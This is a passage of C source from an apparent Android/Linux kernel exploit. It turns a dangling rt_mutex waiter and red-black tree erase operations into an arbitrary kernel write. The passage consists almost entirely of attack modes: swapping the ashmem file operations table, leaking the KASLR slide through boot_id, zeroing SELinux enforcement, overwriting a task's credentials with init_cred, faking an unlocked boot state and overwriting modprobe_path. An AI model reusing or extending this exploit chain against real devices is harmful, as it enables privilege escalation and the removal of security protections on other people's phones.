              active_offsets ? active_offsets->off_ashmem_release : 0,
              ASHMEM_RELEASE_OFF);
          tab[6].slot = 0; /* phase 7: the swap itself */
          tab[6].val = tail;
          int ti = (ph - 1) % 7;
          tree_pc = tab[ti].val;
          tree_r = 0;
          tree_l = tab[ti].slot ? (tail + tab[ti].slot)
                                : (uint64_t)data_addr(
                                      KIMAGE_TEXT_BASE +
                                      (active_offsets
                                           ? (uint64_t)active_offsets->off_ashmem_misc_fops
                                           : ASHMEM_MISC_FOPS_OFF));
          if (env_flag("MODE4_SC_BOOTID_ALL", 0)) {
            /* per-phase shift sweep: the overlay may be offset vs the
             * dangling waiter frame; try -2..+4 across phases. */
            if (env_flag("MODE4_SC_SWEEP", 0)) {
              extern int pselect_shift_override;
              static const int sweep[] = {-4, -5, -6, -7};
              int si = (ph - 1) % 5;
              pselect_shift_override = sweep[si];
              pr_info("SC_BOOTID_ALL ph=%d shift=%d\n", ph,
                      pselect_shift_override);
            }
            /* EVERY phase writes a distinct value (tail+ph*8) to bootid:
             * the final /proc readback shows the LAST landed store. */
            uint64_t bid_off = (active_offsets && active_offsets->off_slide_boot_id)
                                   ? (uint64_t)active_offsets->off_slide_boot_id
                                   : SLIDE_SYSCTL_BOOTID_OFF;
            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + bid_off);
            tree_pc = tail + (uint64_t)ph * 8;
            if (env_flag("MODE4_SC_MODPROBE", 0)) {
              /* visible-store oracle: garble modprobe_path (readable via
               * /proc/sys/kernel/modprobe) - proves stores land. */
              tree_l = KIMAGE_TEXT_BASE + 0x027E0F78ULL; /* modprobe_path (kallsyms) */
              pr_info("SC_MODPROBE ph=%d target=modprobe_path%s", ph, "");
            }
            pr_info("stack mode4 SC_BOOTID_ALL ph=%d *bootid=tail+%d*8\n",
                    ph, ph);
          }
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_prio = 3;
          stack_deadline = 0;
          stack_lock = tail + 0x400 + (uint64_t)(ph - 1) * 0x20;
          if (env_flag("MODE4_SC_TRAP2", 0)) {
            /* erase-path trap: nonzero right word -> two-children successor
             * path -> walks text bytes as rb nodes -> softboot iff the
             * erase executes. */
            tree_r = (uint64_t)text_addr(
                KIMAGE_TEXT_BASE +
                (active_offsets ? active_offsets->off_ashmem_ioctl : 0));
          }
          if (env_flag("MODE4_SC_TRAP", 0)) {
            /* walk liveness trap: nonzero wait_lock -> trylock spins ->
             * softboot IF (and only if) the walk reaches [5]. */
            stack_lock = (uint64_t)text_addr(
                KIMAGE_TEXT_BASE +
                (active_offsets ? active_offsets->off_ashmem_ioctl : 0));
          }
          pr_info("stack mode4 STATIC_CHAIN ph=%d write *(%016llx)=%016llx "
                  "lock=%016llx (%s)\n",
                  ph, (unsigned long long)tree_l, (unsigned long long)tree_pc,
                  (unsigned long long)stack_lock,
                  tab[ti].slot ? "table slot" : "*MISC swap");
        } else if (env_flag("MODE4_VERIFY_SWAP", 0)) {
          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
          if (ph == 1) {
            tree_pc = (uint64_t)fake_fops + 0x80;
            tree_r = 0;
            tree_l = (uint64_t)fake_fops + 0x90;
            pr_info("stack mode4 VERIFY_SWAP p1 oracle only-left "
                    "parent=%016llx left=%016llx (*(fake_fops+0x90)=+0x80)\n",
                    (unsigned long long)tree_pc,
                    (unsigned long long)tree_l);
          } else {
            tree_pc = (uint64_t)fake_fops;
            tree_r = 0;
            tree_l = misc;
            pr_info("stack mode4 VERIFY_SWAP p2 MISC only-left "
                    "parent=fake_fops=%016llx left=MISC=%016llx\n",
                    (unsigned long long)tree_pc,
                    (unsigned long long)tree_l);
          }
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_prio = 3;
          stack_deadline = 0;
          if (env_flag("MODE4_BSS_LOCK", 1) && active_offsets) {
            /* Phase 1 slot: init_task+0x878 — wait_lock sits in struct
             * padding (statically zero, never written), the waiters tree
             * lands on init_task.pi_waiters (permanently empty: swapper
             * never PI-blocks), owner lands on pi_top_task (permanently
             * NULL). Image-verified zeros 2026-08-17.
             * Phase 2 slot: kernel image tail (__bss_stop+0x134, aligned
             * 0x02BB9D00) — zero-mapped, unreferenced by any symbol. */
            uint64_t slot;
            if (ph == 1) {
              slot = (uint64_t)active_offsets->off_init_task + 0x878;
            } else {
              slot = (uint64_t)active_offsets->off_bss_tail_lock;
            }
            stack_lock = data_addr(KIMAGE_TEXT_BASE + slot);
            pr_info("stack mode4 VERIFY_SWAP p%d BSS lock=%016llx "
                    "(%s, zeros)\n",
                    ph, (unsigned long long)stack_lock,
                    ph == 1 ? "init_task+0x878 pi_waiters"
                            : "bss-tail __bss_stop+0x134");
          }
        } else if (env_flag("MODE4_DATAONLY", 0)) {
          /*
           * DATA-ONLY WRITE (no heap, no spray, no fops swap, no CFI):
           * the erase of the stack waiter's own main tree performs
           * child->__rb_parent_color = pc with one LEFT child.
           *   parent_color = 0  -> writes 0 to *left; red node, no
           *                         rebalance; NULL parent -> root update
           *                         writes into the static lock's waiters
           *                         root (our own scratch).
           *   left = pselect_custom_target (P0 alias of the target).
           * Lock = static .data [0,0,0,1] pattern (QEMU-verified
           * init_task+0xAB8): wait_lock unlocked, empty waiters,
           * owner=1 (NULL|HAS_WAITERS) = the Aug-16 clean-exit value.
           * task=init_task (safe). No fake_w0/fake_fops needed.
           */
          /*
           * The compact writer only emits PI-tree words (5-7) + task(8)
           * + lock(9) — main tree words are hardcoded 0. Shape on PI:
           *   pi_parent = 0  (VALUE written; red node, no rebalance)
           *   pi_right  = 0
           *   pi_left   = TARGET (child->__rb_parent_color = pc writes 0)
           * The erase is dequeue_pi(task, waiter) on the stack pi tree.
           */
          tree_pc = 0;
          tree_r = 0;
          tree_l = 0;
          pi_parent = 0;
          pi_right = 0;
          pi_left = (uint64_t)pselect_write_target();
          stack_task = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
              (active_offsets ? active_offsets->off_init_task
                              : INIT_TASK_OFF));
          stack_lock = fake_lock;
          stack_prio = 3;
          stack_deadline = 0;
          pr_info("stack DATAONLY write: *%016llx = 0 (lock=%016llx)\n",
                  (unsigned long long)tree_l,
                  (unsigned long long)stack_lock);
        } else if (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0)) {
          /*
           * Shapes (WRITE_PROOF_SHAPE / target):
           *  left (default bootid/enforce): only-left parent=fake_fops left=tgt
           *    → *tgt=fake_fops. Proven landed on CPH bootid.
           *  classic / fops target default: only-right parent=MISC-8 right=fake_fops
           *    → *MISC=fake_fops without treating MISC as rb left-child (that
           *    softbooted at pre_setattr even with rb-leaf parent shell).
           *  left_misc: force only-left onto MISC (research; known softboot risk).
           */
          uint64_t tgt = pselect_custom_target ? (uint64_t)pselect_custom_target
                                              : misc;
          const char *shape = getenv("WRITE_PROOF_SHAPE");
          int use_classic = 0;
          if (shape && (!strcmp(shape, "classic") || !strcmp(shape, "right")))
            use_classic = 1;
          else if (shape && (!strcmp(shape, "left") || !strcmp(shape, "onlyleft")))
            use_classic = 0;
          else if (tgt == misc || (shape && !strcmp(shape, "auto")))
            use_classic = 1; /* fops/MISC → classic only-right by default */
          else
            use_classic = 0; /* bootid/enforce → only-left */

          if (env_flag("MODE4_WPROOF_SPRAY", 0)) {
            /* Placement oracle (see wproof_spray_verify in util.c): stamp
             * only-left marker write into our own sprayed table. */
            tree_pc = (uint64_t)fake_fops + 0x80;
            tree_r = 0;
            tree_l = (uint64_t)fake_fops + 0x90;
            pi_parent = 0;
            pi_right = 0;
            pi_left = 0;
            stack_lock = fake_lock;
            stack_prio = 3;
            stack_deadline = 0;
            pr_info("stack mode4 WPROOF_SPRAY only-left parent=%016llx "
                    "right=0 left=%016llx (*(fake_fops+0x90)=fake_fops+0x80)\n",
                    (unsigned long long)tree_pc,
                    (unsigned long long)tree_l);
          } else if (env_flag("MODE4_SLIDE_GBOOT", 0)) {
            /*
             * g_boot_state (1-byte .data..ro_after_init) = nonzero.
             * is_unlocked is LDRB+RET so any nz byte is orange.
             * VALUE = P0(0x02BB0000)|1 : same zero rb_node as park (change_child
             * at BSS+8 via parent&~3), stored low byte 1. Z44 proved
             * 0xffffff8100000000 is live DRAM — do not use it as rb_node.
             */
            {
              uint64_t ztgt = (uint64_t)pselect_write_target();
              uint64_t it_off =
                  (active_offsets && active_offsets->off_init_task)
                      ? (uint64_t)active_offsets->off_init_task
                      : (uint64_t)INIT_TASK_OFF;
              uint64_t plain = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
                                                   0x02BB0000ULL);
              tree_pc = plain | 1ULL; /* black: stored byte0=1 */
              tree_r = 0;
              tree_l = ztgt;
              pi_parent = 0;
              pi_right = 0;
              pi_left = 0;
              stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
              stack_lock = data_addr(KIMAGE_TEXT_BASE +
                  (active_offsets && active_offsets->off_bss_tail_lock
                       ? (uint64_t)active_offsets->off_bss_tail_lock
                       : 0x02BB9D00ULL));
              stack_prio = 3;
              stack_deadline = 0;
              pr_info("stack mode4 SLIDE_GBOOT *%016llx = %016llx "
                      "BSS|1 tail lock\n",
                      (unsigned long long)ztgt, (unsigned long long)tree_pc);
            }
          } else if (env_flag("MODE4_SLIDE_KPTR", 0)) {
            /*
             * Z44 KP: VALUE 0xffffff8100000000 is live DRAM, not a zero
             * rb_node. Do not fire this shape again. Prefer SLIDE_GBOOT.
             */
            {
              uint64_t ztgt = (uint64_t)pselect_write_target();
              uint64_t it_off =
                  (active_offsets && active_offsets->off_init_task)
                      ? (uint64_t)active_offsets->off_init_task
                      : (uint64_t)INIT_TASK_OFF;
              uint64_t plain = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
                                                   0x02BB0000ULL);
              tree_pc = plain & ~1ULL;
              tree_r = 0;
              tree_l = ztgt;
              pi_parent = 0;
              pi_right = 0;
              pi_left = 0;
              stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
              stack_lock = data_addr(KIMAGE_TEXT_BASE +
                  (active_offsets && active_offsets->off_bss_tail_lock
                       ? (uint64_t)active_offsets->off_bss_tail_lock
                       : 0x02BB9D00ULL));
              stack_prio = 3;
              stack_deadline = 0;
              pr_info("stack mode4 SLIDE_KPTR *%016llx = BSS (will NOT zero "
                      "the int — Z44 DRAM VALUE banned)\n",
                      (unsigned long long)ztgt);
            }
          } else if (env_flag("MODE4_SLIDE_CRED", 0)) {
            /*
             * *task.cred = init_cred (or sprayed copy). only-left:
             *   pc = VALUE, left = cred_slot, right = 0
             * child->__rb_parent_color writes VALUE into *slot.
             * change_child extra store is at VALUE+8 (init_cred.gid if
             * uid@+4) — not selinux_state. Z16 died on a second KS spray
             * after park; this walk is spray-free BSS overlay like W1.
             */
            {
              uint64_t ztgt = (uint64_t)pselect_write_target();
              /* Z22/Z24: BSS-zero as cred lived the walk then panicked
               * (user_ns NULL). Z17 init_cred KP used dirty W1 lock;
               * retry init_cred with BSS tail lock. gid/suid at +8/+12
               * are 0 → rb left/right 0. */
              uint64_t ic_off =
                  (active_offsets && active_offsets->off_init_cred)
                      ? (uint64_t)active_offsets->off_init_cred
                      : 0x027E0BE0ULL;
              uint64_t val = g_cred_copy
                                 ? (uint64_t)g_cred_copy
                                 : (uint64_t)data_addr(KIMAGE_TEXT_BASE +
                                                       ic_off);
              uint64_t it_off =
                  (active_offsets && active_offsets->off_init_task)
                      ? (uint64_t)active_offsets->off_init_task
                      : (uint64_t)INIT_TASK_OFF;
              tree_pc = val & ~1ULL;
              tree_r = 0;
              tree_l = ztgt;
              pi_parent = 0;
              pi_right = 0;
              pi_left = 0;
              stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
              stack_lock = data_addr(KIMAGE_TEXT_BASE +
                  (active_offsets && active_offsets->off_bss_tail_lock
                       ? (uint64_t)active_offsets->off_bss_tail_lock
                       : 0x02BB9D00ULL));
              stack_prio = 3;
              stack_deadline = 0;
              pr_info("stack mode4 SLIDE_CRED: *%016llx = %016llx "
                      "(%s) BSS tail lock\n",
                      (unsigned long long)ztgt, (unsigned long long)val,
                      g_cred_copy ? "cred_copy" : "init_cred");
            }
          } else if (env_flag("MODE4_SLIDE_ZERO", 0)) {
            /*
             * W1 selinux_state PLAIN-STORE (not 8-byte NULL).
             * 0x02A793C8 is &selinux_state (kallsyms). 5.10 packed bools:
             *   +0 disabled +1 enforcing +2 checkreqprot +3 initialized
             * Z4/Z14 leaf NULL zeroed the whole qword → initialized=0 →
             * SID-to-context fails → ~100s later OplusCfThread SIGKILLs
             * system_server. UMASK/F27 shape: *state = P0(0x02BB0000)
             * (LE 00 00 bb 2a …) so enforcing=0 and initialized≠0.
             * change_child stores into BSS scratch at value+8, not .data.
             * Overlay lock/task stay init_task BSS (Z14 select lived).
             */
            {
              uint64_t ztgt = (uint64_t)pselect_write_target();
              uint64_t it_off =
                  (active_offsets && active_offsets->off_init_task)
                      ? (uint64_t)active_offsets->off_init_task
                      : (uint64_t)INIT_TASK_OFF;
              uint64_t bss_off =
                  (active_offsets && active_offsets->off_bss_tail_lock)
                      ? (uint64_t)active_offsets->off_bss_tail_lock
                      : 0x02BB9D00ULL;
              if (env_flag("MODE4_NULL_STORE", 0)) {
                /* LEAF-NULL (T1 tree_pc=0 is banned): red parent=TARGET-8,
                 * left=right=0. change_child else → *TARGET=0 without
                 * planting TARGET in lock->waiters (that is what KPd T1).
                 * Same geometry as ZERO_NAME (ALIVE). Overlay lock is
                 * init_task+0x878 so W2 cred can use bss_tail. */
                (void)bss_off;
                tree_pc = (ztgt - 8) & ~3ULL;
                tree_r = 0;
                tree_l = 0;
                pi_parent = 0;
                pi_right = 0;
                pi_left = 0;
                stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
                stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
                stack_prio = 3;
                stack_deadline = 0;
                pr_info("stack mode4 LEAF-NULL *%016llx=0 parent=%016llx "
                        "lock=init_task+0x878 (not tree_pc=0)\n",
                        (unsigned long long)ztgt,
                        (unsigned long long)tree_pc);
              } else {
              uint64_t plain = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
                                                   0x02BB0000ULL);
              tree_pc = plain & ~1ULL; /* red */
              tree_r = 0;
              tree_l = ztgt;
              pi_parent = 0;
              pi_right = 0;
              pi_left = 0;
              stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
              stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
              stack_prio = 3;
              stack_deadline = 0;
              pr_info("stack mode4 SLIDE_ZERO PLAIN-STORE *state=%016llx "
                      "val=%016llx (enf=0 init≠0) lock=init_task+0x878\n",
                      (unsigned long long)ztgt, (unsigned long long)plain);
              }
            }
          } else if (env_flag("MODE4_SLIDE_SWAP", 0)) {
            /*
             * THE SWAP: write fake_fops to P0(MISC.fops) using the
             * PROVEN stack-stamp erase (SLIDE mechanism). Bypasses the
             * heap W0.pi placement entirely — the write comes from the
             * fdset stamp on the kernel stack. SLIDE_VERIFY confirmed
             * the table is at fake_fops (owner=0 at +0x00).
             */
            tree_pc = (uint64_t)fake_fops;
            tree_r = 0;
            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
                (active_offsets ? (uint64_t)active_offsets->off_ashmem_misc_fops
                                : ASHMEM_MISC_FOPS_OFF));
            pi_parent = 0;
            pi_right = 0;
            pi_left = 0;
            stack_lock = fake_lock;
            stack_prio = 3;
            stack_deadline = 0;
            pr_info("stack SLIDE_SWAP: *MISC.fops(%016llx) = fake_fops "
                    "(%016llx)\n",
                    (unsigned long long)tree_l,
                    (unsigned long long)tree_pc);
          } else if (env_flag("MODE4_SLIDE_VERIFY", 0)) {
            /*
             * PLACEMENT VERIFIER: write fake_fops (sprayed page address)
             * to boot_id ctl_table.data. Then boot_id reads the first 16
             * bytes AT the fake fops table. If our table is there, we see
             * owner(0) + llseek JT text ptr. If garbage, placement failed.
             * Non-destructive: device survives (proven SL2).
             */
            tree_pc = (uint64_t)fake_fops;
            tree_r = 0;
            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x28da8e0);
            pi_parent = 0;
            pi_right = 0;
            pi_left = 0;
            stack_lock = fake_lock;
            stack_prio = 3;
            stack_deadline = 0;
            pr_info("stack SLIDE_VERIFY: *ctl_table.data = fake_fops "
                    "(%016llx) — boot_id will dump sprayed page\n",
                    (unsigned long long)tree_pc);
          } else if (env_flag("MODE4_SLIDE", 0)) {
            /*
             * Aristotle SLIDE oracle (kallsyms-measured for CPH2521):
             *   tree_pc (VALUE)  = P0(nfulnl_logger)      0x27c14b8
             *   tree_l  (TARGET) = P0(boot_id ctl_table.data) 0x28da8e0
             * The main-tree erase writes: *TARGET = VALUE
             *   -> *(boot_id ctl_table.data) = nfulnl_logger
             * Then: cat /proc/sys/kernel/random/boot_id shows nfulnl_logger
             * bytes (kernel text ptrs) as a UUID -> KASLR slide!
             */
            {
              uint64_t it_off =
                  (active_offsets && active_offsets->off_init_task)
                      ? (uint64_t)active_offsets->off_init_task
                      : (uint64_t)INIT_TASK_OFF;
              tree_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x27c14b8);
              tree_r = 0;
              tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x28da8e0);
              pi_parent = 0;
              pi_right = 0;
              pi_left = 0;
              /* Park overlay: O26–O28 KP'd with spray lock at pre-select. */
              stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
              stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
              stack_prio = 3;
              stack_deadline = 0;
              pr_info("stack mode4 SLIDE NOSPRAY: *%016llx = %016llx "
                      "(nfulnl_logger → boot_id) lock=init_task+0x878\n",
                      (unsigned long long)tree_l,
                      (unsigned long long)tree_pc);
            }
          } else if (use_classic) {
            /* only-right: parent=MISC-8 (black), right=fake_fops → *MISC=fake_fops */
            tree_pc = (misc - 8) & ~3ULL;
            tree_pc |= 1ULL; /* black node — reduce rebalance pressure */
            tree_r = (uint64_t)fake_fops;
            tree_l = 0;
            pi_parent = 0;
            pi_right = 0;
            pi_left = 0;
            stack_lock = fake_lock;
            stack_prio = 200; /* worse than W0=100 → not top after re-enqueue */
            stack_deadline = 0x1000;
            pr_info("stack mode4 ARISTOTLE classic only-right "
                    "parent=MISC-8|1=%016llx right=fake_fops=%016llx left=0 "
                    "prio=200 (*MISC=fake_fops; rb-leaf fops shell)\n",
                    (unsigned long long)tree_pc, (unsigned long long)fake_fops);
          } else {
            /*
             * only-left: parent=value, left=target. Aristotle source dual-stamps
             * main+pi; on CPH dual_pi SOFTBOOTS even on quiet boot_id (2026-08-16
             * fire). Keep main-only default; MODE4_ARISTOTLE_DUAL=1 to probe.
             */
            uint64_t parent_pc = (uint64_t)fake_fops;
            int dual = env_flag("MODE4_ARISTOTLE_DUAL", 0);
            tree_pc = parent_pc;
            tree_r = 0;
            tree_l = tgt;
            if (dual) {
              pi_parent = parent_pc;
              pi_right = 0;
              pi_left = tgt;
            } else {
              pi_parent = 0;
              pi_right = 0;
              pi_left = 0;
            }
            stack_lock = fake_lock;
            stack_prio = 3;
            stack_deadline = 0;
            pr_info("stack mode4 ARISTOTLE only-left parent=fake_fops=%016llx "
                    "right=0 left(tgt)=%016llx prio=3 dual_pi=%d "
                    "(*tgt=fake_fops; main-only default on CPH)\n",
                    (unsigned long long)parent_pc, (unsigned long long)tgt, dual);
          }
        } else if ((env_flag("MODE4_WION", 0) && g_mode4_chain_phase == 1) ||
                   env_flag("MODE4_WAITLOCK0", 0)) {
          /*
           * Clear wait_lock without name=NULL: store P0_PAGE_OFFSET into name.
           * arm64 qspinlock is u32 at &name → needs low 32 bits == 0.
           * 0xffffff8000000000 has low32=0. Prefer over parent=0 (name=NULL softboot).
           */
          uint64_t wl0 = 0xffffff8000000000ULL; /* P0_PAGE_OFFSET / physmap base */
          tree_pc = wl0;
          tree_r = 0;
          tree_l = misc - 8;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = fake_lock;
          stack_prio = 3;
          stack_deadline = 0;
          pr_info("stack mode4 WAITLOCK0 only-left parent=PAGE_OFFSET "
                  "left=MISC-8(name)=%016llx (*name=..8000000000 → wait_lock=0)\n",
                  (unsigned long long)(misc - 8));
        } else if (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 1) {
          /*
           * ZION phase1: only-left *name=0. left=&name (MISC-8), parent_color=0.
           * Same AAW class as bootid proof (left=target, parent_color=value).
           * parent ptr null → change_child updates root; name region becomes
           * tree node — risk if walked; better than parent=MISC-16 leaf.
           */
          tree_pc = 0;
          tree_r = 0;
          tree_l = misc - 8; /* &ashmem_misc.name */
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = fake_lock;
          stack_prio = 3;
          stack_deadline = 0;
          pr_info("stack mode4 ZION_NAME0 only-left parent_color=0 right=0 "
                  "left=MISC-8(name)=%016llx prio=3 (*name=0 for wait_lock)\n",
                  (unsigned long long)(misc - 8));
        } else if (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 2) {
          /* ZION phase2: same as ION_SAFE */
          tree_pc = 1;
          tree_r = (uint64_t)fake_fops;
          tree_l = 0;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = misc - 8;
          stack_prio = 200;
          stack_deadline = 0x1000;
          pr_info("stack mode4 ZION_ION lock=MISC-8=%016llx parent=1 "
                  "right=fake_fops prio=200 (*MISC if wait_lock cleared)\n",
                  (unsigned long long)stack_lock);
        } else if (env_flag("MODE4_PAD3", 0) && g_mode4_chain_phase == 1) {
          /* Zero MISC+16 first (highest neighbor of fops slot as rb_node). */
          tree_pc = 0;
          tree_r = 0;
          tree_l = misc + 16;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = fake_lock;
          stack_prio = 3;
          stack_deadline = 0;
          pr_info("stack mode4 PAD3_1 only-left parent_color=0 left=MISC+16=%016llx "
                  "(*pad=0)\n",
                  (unsigned long long)(misc + 16));
        } else if (env_flag("MODE4_PAD3", 0) && g_mode4_chain_phase == 2) {
          tree_pc = 0;
          tree_r = 0;
          tree_l = misc + 8;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = fake_lock;
          stack_prio = 3;
          stack_deadline = 0;
          pr_info("stack mode4 PAD3_2 only-left parent_color=0 left=MISC+8=%016llx "
                  "(*pad=0)\n",
                  (unsigned long long)(misc + 8));
        } else if (env_flag("MODE4_PAD3", 0) && g_mode4_chain_phase == 3) {
          tree_pc = (uint64_t)fake_fops;
          tree_r = 0;
          tree_l = misc;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = fake_lock;
          stack_prio = 3;
          stack_deadline = 0;
          pr_info("stack mode4 PAD3_3 only-left parent=fake_fops left=MISC=%016llx "
                  "(*MISC=fake_fops after pads)\n",
                  (unsigned long long)misc);
        } else if (env_flag("MODE4_FOPS_SLOT", 0)) {
          /*
           * Patch ashmem_fops.write slot (usually 0) via only-left.
           * left=&fops.write, parent=fake_fops → *write=fake_fops (not ideal JT
           * but tests whether .data fops table is safer than miscdevice).
           */
          uint64_t fops_off =
              (active_offsets && active_offsets->off_ashmem_fops)
                  ? active_offsets->off_ashmem_fops
                  : ASHMEM_FOPS_OFF;
          uint64_t slot = data_addr(KIMAGE_TEXT_BASE + fops_off) +
                          (uint64_t)FOPS_WRITE_OFF;
          tree_pc = (uint64_t)fake_fops;
          tree_r = 0;
          tree_l = slot;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = fake_lock;
          stack_prio = 3;
          stack_deadline = 0;
          pr_info("stack mode4 FOPS_SLOT only-left parent=fake_fops "
                  "left=ashmem_fops.write=%016llx (*slot=fake_fops probe)\n",
                  (unsigned long long)slot);
        } else if (env_flag("MODE4_KIMAGE_MISC", 0)) {
          /*
           * only-left *MISC=fake_fops but left=kimage VA not P0 linear alias.
           * Tests whether softboot is P0-alias-specific vs any MISC touch.
           */
          uint64_t misc_img =
              KIMAGE_TEXT_BASE +
              ((active_offsets && active_offsets->off_ashmem_misc_fops)
                   ? active_offsets->off_ashmem_misc_fops
                   : ASHMEM_MISC_FOPS_OFF);
          tree_pc = (uint64_t)fake_fops;
          tree_r = 0;
          tree_l = misc_img;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = fake_lock;
          stack_prio = 3;
          stack_deadline = 0;
          pr_info("stack mode4 KIMAGE_MISC only-left parent=fake_fops "
                  "left=kimage_MISC=%016llx (not P0)\n",
                  (unsigned long long)misc_img);
        } else if (env_flag("MODE4_P0_MISC", 0)) {
          /* Explicit P0 only-left *MISC=fake_fops (same as WRITE_PROOF fops left) */
          tree_pc = (uint64_t)fake_fops;
          tree_r = 0;
          tree_l = misc;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = fake_lock;
          stack_prio = 3;
          stack_deadline = 0;
          pr_info("stack mode4 P0_MISC only-left parent=fake_fops "
                  "left=P0_MISC=%016llx\n",
                  (unsigned long long)misc);
        } else if (env_flag("MODE4_ZERO_NAME", 0) ||
                   (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 1) ||
                   (env_flag("MODE4_ZIO", 0) && g_mode4_chain_phase == 1) ||
                   (env_flag("MODE4_CHAIN", 0) && g_mode4_chain_phase == 1 &&
                    !env_flag("MODE4_ZION", 0) && !env_flag("MODE4_ZI", 0) &&
                    !env_flag("MODE4_ZIO", 0))) {
          /*
           * Leaf parent=MISC-16 → __rb_change_child else → *name=0.
           * left=right=0 so re-enqueue does not walk MISC (unlike only-left).
           * Proven ALIVE on CPH; required wait_lock clear for ION.
           */
          tree_pc = (misc - 16) & ~3ULL;
          tree_r = 0;
          tree_l = 0;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          /* ALIVE ZERO_NAME used compact prio=0 and BSS-class overlay,
           * not spray lock + prio 200 (ZI 7239f288 KP at place). */
          {
            uint64_t it_off =
                (active_offsets && active_offsets->off_init_task)
                    ? (uint64_t)active_offsets->off_init_task
                    : 0x027CC000ULL;
            stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
          }
          stack_prio = 0;
          stack_deadline = 0;
          pr_info("stack mode4 ZERO_NAME parent=MISC-16=%016llx right=0 "
                  "left=0 prio=0 lock=init_task+0x878 (leaf *name=0; "
                  "chain_phase=%d)\n",
                  (unsigned long long)tree_pc, g_mode4_chain_phase);
        } else if (env_flag("MODE4_ZERO_OWNER", 0) ||
                   (env_flag("MODE4_ZIO", 0) && g_mode4_chain_phase == 2) ||
                   (env_flag("MODE4_CHAIN", 0) && g_mode4_chain_phase == 2 &&
                    !env_flag("MODE4_ZION", 0) && !env_flag("MODE4_ZI", 0) &&
                    !env_flag("MODE4_ZIO", 0))) {
          /*
           * CHAIN phase2: leaf parent=MISC+8 (miscdevice.list as rb_node).
           * __rb_change_child else → parent->rb_right=NULL → *(MISC+16)=0.
           * That clears list.prev == rt_mutex.owner when lock=MISC-8.
           */
          tree_pc = (misc + 8) & ~3ULL;
          tree_r = 0;
          tree_l = 0;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = fake_lock;
          stack_prio = 200;
          stack_deadline = 0x1000;
          pr_info("stack mode4 ZERO_OWNER parent=MISC+8=%016llx right=0 "
                  "left=0 prio=200 (leaf → *list.prev=0 @MISC+16; "
                  "chain_phase=%d)\n",
                  (unsigned long long)tree_pc, g_mode4_chain_phase);
        } else if (env_flag("MODE4_ROOT_SPRAY", 0)) {
          /*
           * Root erase into fake_lock.waiters. right must be valid rb leaf
           * (+0 black, +8/+16 zero) or re-enqueue walks garbage (EXP_W).
           */
          tree_pc = 1;
          tree_r = fake_fops; /* requires MODE4_FOPS_RB_LEAF prep in util */
          tree_l = 0;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = fake_lock;
          stack_prio = 90;
          stack_deadline = 0x1000;
          pr_info("stack mode4 ROOT_SPRAY parent=1 right=fake_fops "
                  "lock=fake (root erase → *lock.waiters)\n");
        } else if (env_flag("MODE4_ION_ROOT", 0) || env_flag("MODE4_ION_SAFE", 0) ||
                   (env_flag("MODE4_CHAIN", 0) && g_mode4_chain_phase == 3) ||
                   (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 2) ||
                   (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 2) ||
                   (env_flag("MODE4_WION", 0) && g_mode4_chain_phase == 2) ||
                   (env_flag("MODE4_ZIO", 0) && g_mode4_chain_phase == 3)) {
          /*
           * Ion root: lock=MISC-8, parent=1, right=fake_fops leaf, left=0.
           * Overlays: wait_lock=name, waiters=*MISC, owner=*(MISC+16).
           * Needs wait_lock=0 and owner=0 (ZIO phases 1–2) or race softboot.
           */
          tree_pc = 1;
          tree_r = fake_fops;
          tree_l = 0;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = misc - 8;
          stack_prio = 200;
          stack_deadline = 0x1000;
          pr_info("stack mode4 %s lock=MISC-8=%016llx parent=1 right=fake_fops "
                  "prio=200 (root → *MISC; chain_phase=%d)\n",
                  (env_flag("MODE4_ION_SAFE", 0) ||
                   (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 2) ||
                   (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 2) ||
                   (env_flag("MODE4_WION", 0) && g_mode4_chain_phase == 2) ||
                   (env_flag("MODE4_ZIO", 0) && g_mode4_chain_phase == 3) ||
                   g_mode4_chain_phase == 3)
                      ? "ION_SAFE"
                      : "ION_ROOT",
                  (unsigned long long)stack_lock, g_mode4_chain_phase);
